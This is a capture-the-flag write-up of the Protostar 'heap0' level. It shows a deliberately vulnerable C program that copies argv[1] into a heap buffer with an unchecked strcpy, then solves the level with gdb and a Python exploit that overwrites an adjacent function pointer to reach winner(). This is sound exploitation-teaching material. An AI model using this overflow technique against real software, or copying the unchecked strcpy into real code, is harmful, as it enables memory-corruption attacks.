#### Heap0

###### About

- This level introduces heap overflows and how they can influence code flow.
- This level is at `/opt/protostar/bin/heap0`

`heap0.c`

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./heap0
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./heap0 AAAA
data is at 0x804a008, fp is at 0x804a050
level has not been passed
user@protostar:/opt/protostar/bin$
```

`pattern.py`

```python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print padding
```

```sh
user@protostar:/tmp$ python pattern.py > pattern
```

```sh
user@protostar:/tmp$ cat pattern
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
user@protostar:/tmp$
```

```sh
user@protostar:/opt/protostar/bin$ gdb ./heap0 -q
Reading symbols from /opt/protostar/bin/heap0...done.
(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Starting program: /opt/protostar/bin/heap0 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()
(gdb) p winner
$1 = {void (void)} 0x8048464 <winner>
(gdb)
```

```
>>> chr(0x53)
'S'
>>>
```

`exploit.py`

```python
import struct

buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
address =  struct.pack("I", 0x8048464)

print buffer+address
```

```sh
user@protostar:/opt/protostar/bin$ ./heap0 $(python /tmp/exploit.py)
data is at 0x804a008, fp is at 0x804a050
level passed
user@protostar:/opt/protostar/bin$
```